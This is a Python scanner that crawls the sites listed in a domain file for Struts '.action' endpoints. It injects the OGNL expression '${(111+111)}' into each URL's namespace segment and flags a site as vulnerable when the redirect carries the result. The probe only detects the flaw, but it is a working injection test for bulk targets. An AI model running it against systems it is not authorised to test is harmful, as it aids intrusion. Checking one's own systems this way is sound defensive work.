import requests
import re
from bs4 import BeautifulSoup


def collect_url():
    url_list = []
    with open('domain.txt', 'r') as url_file:
        for line in url_file:
            url = line.strip()
            if not url:
                continue
            if url.startswith('http'):
                if url.endswith('/'):
                    url = url[0:-1]
                url_list.append(url)
            else:
                if url.endswith('/'):
                    url_list.append('http://'+url[0:-1])
                    url_list.append('https://'+url[0:-1])
                else:
                    url_list.append('http://'+url)
                    url_list.append('https://'+url)
    return url_list


def search_action(url_list):
    for url in url_list:
        try:
            res = requests.get(url)
        except:
            continue
        try:
            main_url = re.search(r'(http://|https://).+?/', url).group()
            main_url = main_url[0:-1]
        except:
            print('Error: 无法获取主域名： %s' % url)
            continue
        soup = BeautifulSoup(res.content, 'html5lib')
        print('[-] ' + url)
        check_vul(url)
        link_list = [link.get('href') for link in soup.find_all('a')]
        re_link_list = []
        for i in link_list:
            try:
                re_link_list.append(re.search(r'.+\.action', i).group())
            except:
                continue
        re_link_list = set(re_link_list)
        for target_url in re_link_list:
            if target_url and '.action' in target_url:
                try:
                    target_url, jsessionid = target_url.split(';')
                    if target_url.endswith('.action'):
                        if not target_url.startswith('/'):
                            target_url = '/' + target_url
                        print('[-] '+ target_url)
                        check_vul(main_url+target_url)
                except:
                    pass
                try:
                    target_url, pattern = target_url.split('?')
                    if target_url.endswith('.action'):
                        if not target_url.startswith('/'):
                            target_url = '/' + target_url
                        print('[-] '+ target_url)
                        check_vul(main_url+target_url)
                except:
                    pass
            if target_url.endswith('.action'):
                if not target_url.startswith('/'):
                    target_url = '/' + target_url
                print('[-] ' + target_url)
                check_vul(main_url + target_url)


def check_vul(full_target_url):
    url_piece = full_target_url.split('/')
    url_piece[-2] = '${(111+111)}'
    test_url = ''
    for i in url_piece:
        if i == url_piece[-1]:
            test_url = test_url + i
        else:
            test_url = test_url + i + '/'
    try:
        res = requests.get(test_url)
    except:
        return None
    if '302' in str(res.history) and '222' in res.url:
        print('!!![+]!!! vul detected: %s' % full_target_url)


if __name__ == '__main__':
    print('loading url file......')
    url_list = collect_url()
    print('start checking......')
    search_action(url_list)
    print('stop chekcing......')
